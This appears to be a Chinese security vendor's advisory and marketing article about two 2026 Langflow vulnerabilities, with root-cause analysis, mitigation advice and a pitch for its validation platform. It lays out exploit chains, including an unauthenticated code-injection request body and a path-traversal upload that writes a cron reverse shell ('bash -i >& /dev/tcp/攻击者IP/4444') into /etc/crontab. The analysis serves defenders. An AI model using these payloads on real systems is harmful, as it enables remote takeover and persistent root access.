#  助阵国家级AI漏洞库启动：塞讯科技发布 Langflow 高危漏洞专项研判与复现报告  
 塞讯安全验证   2026-05-07 08:25  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/D3YzQzbXJGZ6TpQTg6aLIewNELxKrkCmmRjaIWsIQNYpH196pAcAOaJ5p6FqRU3xpOqeibIk7Sh7eFEPbHRlQaw/640?wx_fmt=gif&from=appmsg "")  
![]( "")  
![]( "")  
  
近日，「国家人工智能安全漏洞库启动运行发布会」在北京盛大启幕。作为 CNNVD 的技术支撑单位，塞讯科技受邀出席本次盛会，并在现场见证我国人工智能安全治理进入常态化运行的历史时刻：  
AI 工具链的安全风险已被国家级机构视为独立威胁类别，纳入常态化监控。  
  
塞讯安全实验室持续关注研究，塞讯智能安全验证平台攻击库更新与 CNNVD 近期持续发布的《人工智能重要漏洞通报》同频。我们对引起全球关注的 AI 基础设施 Langflow 高危漏洞进行了深度复现与前瞻研判，研究发现，在默认配置下，这些漏洞足以让攻击者「如入无人之境」。作为对 AI 安全漏洞库启动的实战礼赞，本文将率先披露这些漏洞的深度技术细节及验证方案。  
  
经过实验室的独立复现分析与验证，我们发现这两个漏洞  
均可在默认配置下实现无认证远程代码执行，危害程度比 NVD 原始描述更为严峻：  
  
![](https://mmecoa.qpic.cn/mmecoa_png/NFUgVR5BdTXoAhktUbRumZF2vVwoftarC8dOcbfMs6KHUVrmGXpBDhd2vCjhyzF4zSPyvbqLaMzxPGd8dfKJEzibr1rxTrCL4lbrN93Ob5pY/640?wx_fmt=png&from=appmsg "")  
  
**重要版本提示：**  
CVE-2026-33017 已在 1.8.2 修复，CVE-2026-5027 影响范围延伸至 1.8.4，意味着已升级 1.8.2/1.8.3 的企业，仍面临第二个漏洞的威胁。  
  
塞讯智能安全验证平台已完成上述两个漏洞的验证规则构建，并具备覆盖   
10 款 AI 应用、40+ 漏洞的持续验证能力。企业安全团队可通过塞讯智能安全验证平台直接验证现有防御体系能否有效拦截针对 Langflow 的真实攻击载荷。  
  
![飞书文档 - 图片](https://mmecoa.qpic.cn/mmecoa_jpg/NFUgVR5BdTXicDu1Z28kD9h8lmZuvWKe2hKtMcOOicSkVU0MassYW2fhaj7b1hW08A9bXibZ5hG4X8HtLHTgMEdWicicDZ1rsb2BJej2oyIaggY8/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmecoa.qpic.cn/mmecoa_png/NFUgVR5BdTUHAKjca1icr3gatbRLVKzE2J5ic8K2G4af9rziaz0Wian6dyrtjnezYADT16p7FcLKT5J44UwH3wqxxZHLLciaFtXXC3QnpG6Via8lI/640?wx_fmt=png&from=appmsg "")  
> 塞讯智能安全验证平台 AI 漏洞验证规则库概览  
  
  
![](https://mmecoa.qpic.cn/sz_mmecoa_png/D3YzQzbXJGZ705GuYR5Aibzic1a6ic7sIONERnduMt4ibYzraNn13yTZdSc2YRtWqY7EmEsXjxGBUM8oWC3qavqu8w/640?wx_fmt=png&from=appmsg "")  
## 信号：AI 基础设施漏洞，已从「边缘威胁」升级为「重点管控」  
  
2026 年，AI 基础设施漏洞的增速已超出大多数安全团队的预期。  
  
CNNVD 从 2026 年初开始，每两周发布一期《人工智能重要漏洞通报》，截至 2026 年 4 月已累计发布 5 期，共采集 AI 相关漏洞 974 个，其中：  
- 超危漏洞（CVSS ≥ 9.0）：  
占比约 11%，远高于传统应用软件漏洞均值  
- 高危漏洞（CVSS 7.0–8.9）：  
占比约 34%  
- 涉及厂商/项目包括：  
OpenClaw、Ollama、MLflow、Langflow 等广泛部署的 AI 基础设施平台  
**平均每天新增约 23 个 AI 工具链漏洞。**  
 这一趋势的根本驱动因素，是 AI 基础设施的快速扩张与安全成熟度的严重错配：  
  
**企业 AI 工具链的典型安全盲区：**  
  
部署速度碾压安全审计：  
  
AI 流程编排工具（Langflow、n8n）、模型训练平台（MLflow）、模型服务框架（BentoML、Ollama）的部署周期以小时计，安全评估来不及介入  
  
互联网直接暴露：  
  
相当比例的 Langflow 实例直接暴露在公网，且未修改默认配置——这正是本文两个漏洞造成大规模危害的直接原因  
  
依赖复杂，补丁滞后：  
  
AI 工具链依赖的 Python 包生态复杂，部分企业从漏洞披露到完成部署需要数周  
  
安全防御产品覆盖不足：  
  
传统 EDR 对 AI 工具链中的 Python 进程行为检测能力有限，异常行为往往被忽视  
  
![](https://mmecoa.qpic.cn/mmecoa_jpg/NFUgVR5BdTWvtbuEpeabxpm8SsqbbdLfiamKeJhXxsN2UdSLh0WrRPIkG626kUVubuxAfVkuOrpU6OEKhKJXGCicONqAiaWWiaGt1891TYT9NPQ/640?wx_fmt=jpeg "")  
  
CNNVD 专项建档的政策信号同样值得重视：国家级机构将 AI 供应链安全纳入常态化监控，意味着合规压力将随之而来——金融、能源、关键基础设施行业的安全团队需要提前准备   
AI 工具链安全防护能力的可量化证明。  
  
![](https://mmecoa.qpic.cn/sz_mmecoa_png/D3YzQzbXJGZ705GuYR5Aibzic1a6ic7sIONhLiaPibicj5EGtafxy21KLY4RyMbAgTSDa2YhSdHnJW4Jduh4a6vcOJbQ/640?wx_fmt=png&from=appmsg "")  
## Langflow：高价值目标，攻击面全面打开  
  
Langflow 是一款基于可视化流程编排的 AI 应用开发平台，允许用户通过拖拽的方式将 LLM（如 GPT-4、Claude、Llama）、数据库、API 接口、Python 代码节点连接为可执行的 AI 工作流。由于其极低的 AI 应用开发门槛，Langflow 在企业内部 AI 应用快速落地浪潮中被广泛采用，尤其集中在：  
- **AI 应用研发团队：**  
用于快速原型验证和内部工具开发  
  
- **AI 基础平台：**  
部分企业将 Langflow 作为内部 AI 服务的编排层，托管对接多个业务系统的工作流  
  
- **AI 能力输出节点：**  
通过公开 Flow 对外提供 AI 服务，暴露于公网  
  
Langflow 的架构使其天然成为高价值攻击目标：  
  
**执行环境权限高：**  
  
Langflow 工作流中的代码节点直接在服务器 Python 运行时中执行，获取 RCE 即等价于控制整个宿主机  
  
**连接凭据集中：**  
  
典型的 Langflow 实例会存储企业的 OpenAI API Key、数据库连接字符串、第三方 SaaS 访问凭据  
  
**网络位置敏感：**  
  
部署在企业内网或云环境中的 Langflow 往往具有访问内网系统的网络权限，是横向移动的理想跳板  
##   
## CVE-2026-33017：无需敲门，直接进厨房（未认证 RCE）  
  
漏洞概述  
  
![](https://mmecoa.qpic.cn/mmecoa_png/NFUgVR5BdTWsiaxibh0G0DicXFiaV82dznTTw1f1SMibPf7k9TfwW6bpHia9tupumpTPhHibLzcyemBCA8C8WKbIR2wqKeE0EUqZILJqygVaX7xCro/640?wx_fmt=png&from=appmsg "")  
  
漏洞机制（T1190 — 利用面向公众的应用程序）  
  
Langflow 提供了一个「公开 Flow」功能，允许用户创建无需认证即可执行的 AI 工作流，对应的构建端点为：  
```
POST /api/v1/build_public_tmp/{flow_id}/flow
```  
  
该端点的  
设计意图是让访问者使用存储在数据库中的流程数据运行指定 Flow。然而，漏洞在于：  
当请求中包含可选的   
data  
 参数时，端点将优先使用攻击者提供的 flow 数据，而非数据库中的原始数据。  
  
Langflow 的 Flow 数据结构允许在节点定义中内嵌任意 Python 代码。攻击者只需构造一个包含恶意 Python 代码的 flow 数据，通过上述端点提交，即可触发服务器端的  
 exec() 执行——  
无认证、无沙箱、无任何过滤。  
```
攻击者（无需任何凭据）    |    | POST /api/v1/build_public_tmp/{任意flow_id}/flow    | Body: {"data": {"nodes": [{"code": "import os; os.system('命令')"}]}}    |    ↓Langflow 服务器    |    | exec(攻击者提供的代码)  ← 直接执行，无沙箱    |    ↓服务器完全沦陷
攻击者（无需任何凭据）
    |
    | POST /api/v1/build_public_tmp/{任意flow_id}/flow
    | Body: {"data": {"nodes": [{"code": "import os; os.system('命令')"}]}}
    |
    ↓
Langflow 服务器
    |
    | exec(攻击者提供的代码)  ← 直接执行，无沙箱
    |
    ↓
服务器完全沦陷
```  
  
塞讯安全实验室分析笔记  
  
塞讯安全实验室在对该漏洞进行独立复现时，注意到与 Langflow 此前修复的 CVE-2025-3248  
（/api/v1/validate/code 端点）存在根本性差异：CVE-2025-3248 的修复方案是为   
/validate/code 端点增加认证检查，但开发团队并未将相同的认证逻辑同步至   
/build_public_tmp 端点——该端点在设计上服务于公开 Flow，因此默认不要求认证，补丁形成了明显的覆盖盲区。  
  
为何危害如此之大  
  
任意代码 + 无认证  
 的组合意味着：互联网上任何人只要找到一个暴露公网的 Langflow 实例，无需账号、无需 API Key，即可执行服务器命令。Sysdig 的威胁研究团队记录到，在该漏洞公开披露后的   
20 小时内，攻击者就已开始大规模扫描并利用该漏洞，攻击目标包括企业内网 Langflow 部署和云端 AI 服务节点。  
  
这一速度也是 CISA 将其紧急列入 KEV（已知被利用漏洞目录）的直接原因，要求美国联邦机构在 14 天内完成修复。  
  
![](https://mmecoa.qpic.cn/sz_mmecoa_png/D3YzQzbXJGZ705GuYR5Aibzic1a6ic7sIONVD9dF7gCv9dKWldh9f4HAcZ9HfHBPyexPyF2cF4BcyhceAsuz9XgQw/640?wx_fmt=png&from=appmsg "")  
## CVE-2026-5027：NVD 评分「高危」，实际危害超越「超危」  
  
漏洞概述  
  
![](https://mmecoa.qpic.cn/sz_mmecoa_png/NFUgVR5BdTWCv82axxzaat4X5UBHMmwTt4pF62Qv4bzTOZwDmVXbDvAjma5VOsLrtMtQRtytAwNywrpsCicfDHezvqzeMf5A6PoVrysPZgOI/640?wx_fmt=png&from=appmsg "")  
  
⚠ 为什么 NVD 的 PR:L（低权限）描述具有误导性  
  
NVD 将 CVE-2026-5027 的 CVSS 向量标记为  
 PR:L（Privileges Required: Low），暗示攻击者至少需要一个低权限账号才能利用该漏洞。然而，塞讯安全实验室分析均揭示了同一个关键事实：  
  
Langflow 在出厂默认配置下开启了 auto-login 功能。  
 攻击者只需向  
 /api/v1/auto_login 端点发送一个不含任何凭据的 GET 请求，即可获得一个有效的 JWT 访问令牌。这意味着：  
```
GET /api/v1/auto_login  →  返回有效 JWT（无需用户名、无需密码）
```  
  
结合路径穿越漏洞，  
CVE-2026-5027 在绝大多数生产部署中与「无认证」没有本质区别。完整利用链如下：  
```
第一步：获取 Token（0 凭据）
GET /api/v1/auto_login
← access_token: eyJ...（有效 JWT）
第二步：路径穿越写入 /etc/crontab
POST /api/v2/files
Authorization: Bearer eyJ...
Content-Type: multipart/form-data
filename = "../../../etc/crontab" ← 路径穿越，逃出上传目录
file = "* * * * * root bash -i >& /dev/tcp/攻击者IP/4444 0>&1"
第三步：等待 60 秒
Cron 守护进程执行写入的任务
← 攻击者收到 root shell
```  
  
漏洞根因：代码级分析（T1548 - 滥用权限提升控制机制）  
  
塞讯安全实验室定位到了相同的根因代码。漏洞位于：  
```
src/backend/base/langflow/api/v2/files.py
→ upload_user_file()
```  
  
该函数从 multipart form data 中直接取用客户端传入的文件名，未做任何路径安全处理：  
```
new_filename = file.filename  # ← 用户控制，无清洗# 传入存储服务file_path = folder_path / file_name  # ← pathlib 路径拼接，不阻止 ../async with async_open(str(file_path), "wb") as f:    await f.write(data)
new_filename = file.filename  # ← 用户控制，无清洗
# 传入存储服务
file_path = folder_path / file_name  # ← pathlib 路径拼接，不阻止 ../
async with async_open(str(file_path), "wb") as f:
    await f.write(data)
```  
  
folder_path / "../../../etc/crontab" 的结果是绝对路径  
 /etc/crontab，Python 的 pathlib 不会阻止此类路径穿越。  
  
漏洞根因：代码级分析（T1548 - 滥用权限提升控制机制）  
### 为何 1.8.2 补丁不够用  
  
CVE-2026-33017 的修复版本是 1.8.2，而 CVE-2026-5027 的受影响版本延伸至 1.8.4。这意味着：  
> 已将 Langflow 升级到 1.8.2 或 1.8.3 的企业，在 CVE-2026-33017 修复的同时，仍完全暴露在 CVE-2026-5027 的攻击面下。  
  
  
![](https://mmecoa.qpic.cn/sz_mmecoa_png/NFUgVR5BdTWibSHHwEhk5PxzLyZDvlhY5Ld7nkhhvdwolQke56WTToErUAWapuiauicySAwicTxDsWN2xcAyOetWZ0VEibgE8RuM537Bhe7RAYQE/640?wx_fmt=png&from=appmsg "")  
> 塞讯安全实验室复现 CVE-2026-5027 截图  
  
##   
## 你的防御体系能拦住这两个漏洞吗？  
  
漏洞存在和漏洞能被利用是两回事；漏洞能被利用和你的防御能拦住是另外一回事。  
  
大多数企业在面对新漏洞时的处置流程是：看到披露 → 评估资产是否受影响 → 推送补丁 → 认为问题解决。这个流程忽略了一个关键环节：  
当你的应用由于各种客观原因暂时无法升级或无法打补丁时，你的 WAF、EDR、DS 等防御工具，面对针对这两个漏洞的真实攻击载荷，到底能不能检出和拦截？  
  
塞讯智能安全验证平台回答的正是这个问题。  
  
塞讯安全实验室：产品验证规则的转化路径  
  
塞讯安全实验室在完成对 CVE-2026-33017 和 CVE-2026-5027 的独立分析和复现后，将漏洞利用链条转化为可在客户真实环境中执行的安全验证规则，并纳入塞讯智能安全验证平台的攻击库。这一转化过程包括：  
1. **情报采集：**  
跟踪 NVD、CISA KEV、Tenable Advisory、GitHub PoC 仓库（Yahia Hamza、EQSTLab）等多源情报  
  
1. **漏洞复现：**  
在实验室环境搭建受影响版本的 Langflow，完整复现两个漏洞的利用链  
  
1. **代码级根因分析：**  
定位到   
langflow/api/v2/files.py 中的   
upload_user_file() 函数和   
/build_public_tmp 端点的认证逻辑缺陷  
  
1. **验证规则构建：**  
将真实攻击载荷封装为塞讯智能安全验证平台规则，支持在客户的真实防御环境中执行并自动判断拦截结果  
  
塞讯智能安全验证平台当前 AI 漏洞验证能力  
  
针对 AI 基础设施安全，塞讯智能安全验证平台已构建覆盖   
10 款 AI 相关应用、  
40+ 漏洞的安全验证规则库：  
  
![](https://mmecoa.qpic.cn/mmecoa_png/NFUgVR5BdTViaIbpSgCPZKFNt2fMBCdDVHZ1mU8H2HSwZ8wfA65DAshKzwHwJPwNVWSM0DwMticuP1PydOgV8iaewkC71gDhJFpIPzeJb6k9aM/640?wx_fmt=png&from=appmsg "")  
  
  
塞讯智能安全验证平台验证的核心问题  
  
针对 CVE-2026-33017 和 CVE-2026-5027，塞讯智能安全验证平台在客户真实环境中执行验证后，能够精确告知安全团队：  
- WAF 是否拦截了恶意 flow 数据中的代码注入载荷？（CVE-2026-33017）  
  
- WAF 是否识别了路径穿越攻击中的   
../   
序列？（CVE-2026-5027）  
  
- EDR 是否检测到 Python 进程执行的异常命令？（CVE-2026-33017 后利用阶段）  
  
- DS 是否检测到 auto_login 端点的异常调用，并将其与后续文件上传动作关联？（CVE-2026-5027）  
  
- SIEM 是否产生了对应的告警，告警时间是否准确？  
  
![AI安全防御验证](https://mmecoa.qpic.cn/mmecoa_jpg/NFUgVR5BdTVy7IJFyxWg7ZYKWkicp9XKSOLvMX0AdyU8qNBCjbr7cwmMJBhLrlFFVRks6aWyN6SlqMpBG0QYY3dmHekFSTxpaVv4fh0rlI8E/640?wx_fmt=jpeg "")  
  
为什么补丁不够用  
- 补丁到位后，是否有遗留的 Cron 任务或 Webshell 需要排查？  
塞讯智能安全验证平台的验证可以保留环境来帮助安全团队确认修补后的环境是否已彻底清洁。  
  
- AI 工具链漏洞不止这两个。  
CNNVD 五期通报累计 974 个 AI 漏洞，企业无法手动跟踪每一个。塞讯智能安全验证平台的攻击库持续更新，自动将最新威胁情报转化为可执行的验证规则，确保企业的防御能力与威胁演进同步。  
  
##   
## 行动建议  
### 对于已部署 Langflow 的企业  
1. **立即升级至 Langflow 1.8.5 或更高版本：**  
注意：升级到 1.8.2 仅修复 CVE-2026-33017，CVE-2026-5027 影响至 1.8.4，必须升级到 1.8.5+  
  
1. **立即关闭 auto-login：**  
将环境变量   
LANGFLOW_AUTO_LOGIN 设置为   
false，这是阻断 CVE-2026-5027 默认无认证利用链的最快缓解措施  
  
1. **检查公开 Flow 配置：**  
确认是否有 Flow 设置为无认证公开访问，评估 CVE-2026-33017 的暴露面  
  
1. **审计 Cron 任务和文件系统：**  
检查  
 /etc/crontab、  
/etc/cron.d/ 等路径是否存在可疑条目，排查是否已遭 CVE-2026-5027 利用并植入持久化任务  
  
1. **轮换所有凭据：**  
轮换存储在 Langflow 中的 OpenAI API Key、数据库连接密码、第三方 SaaS 访问凭据  
  
### 对于希望验证防御有效性的安全团队：  
  
联系塞讯科技，使用塞讯智能安全验证平台在你们的真实环境中验证现有安全防御体系对 CVE-2026-33017 和 CVE-2026-5027 的实际拦截能力。在攻击者动手之前，先让塞讯智能安全验证平台替你试一次。  
  
漏洞技术指标（IOC）  
  
![](https://mmecoa.qpic.cn/mmecoa_png/NFUgVR5BdTUIHQhEiaNpfKibY18B39Cyiau3yJ6PHtS9GicIhNF8ntO1ltfonnvYB0oKOy0XAT8uibUPjH8HyeJwOOFw0t4qFKAoWozVSMvusXD0/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
**以情报洞察未知，以验证锚定安全**  
  
  
****  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/D3YzQzbXJGZ6X2NtUtFjicOPdYZbdXy10MvHQBIuSJGLDTSiaPRQTib1ZHKqLjibLs8Jm9fIYaCBpzUfFj1Efibvtvw/640?wx_fmt=gif&wxfrom=10005&wx_lazy=1&wx_co=1&randomid=iyt7hkoz&tp=wxpic#imgIndex=33 "")  
  
**长按图片扫码添加【官方客服】**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/D3YzQzbXJGZc61MO7yLs2nJa9K6ndfaocica0SmniasTB10oR41lBMfPRlT9mtF0ku3GdRO30Mj4UMs0YCw8Y0cQ/640?wx_fmt=other&wxfrom=10005&wx_lazy=1&wx_co=1&randomid=vedmokhe&tp=wxpic#imgIndex=36 "")  
  
[](https://mp.weixin.qq.com/s?__biz=Mzk0MTMzMDUyOA==&mid=2247508378&idx=1&sn=7512bcced06e275ff9095f7acae9139b&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=Mzk0MTMzMDUyOA==&mid=2247508346&idx=1&sn=0cbbfbc087d06acb1b721279cf46c6de&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=Mzk0MTMzMDUyOA==&mid=2247508346&idx=2&sn=dc5d64d7254d90dd319262150ed7742e&scene=21#wechat_redirect)  
  
  
![图片](https://mmecoa.qpic.cn/sz_mmecoa_png/NFUgVR5BdTX3NBjibce13yPLAV7oUSjdTcoUicKKUj8CyyRh9MwL1az8tBbicHKRibMPAmLQyiby2x7azm6FSmmA3MxbeYyOaubAoibsHmeLABDsw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=10005&wx_lazy=1#imgIndex=16 "")  
  
▶▶  
关注【塞讯安全验证】，了解塞讯安全度量验证平台以及更多安全资讯  
  
  
▶▶  
关注【塞讯威胁情报】，  
解锁 AI 赋能的新一代威胁情报中枢，获取第一手恶意 skills 情报  
  
  
  
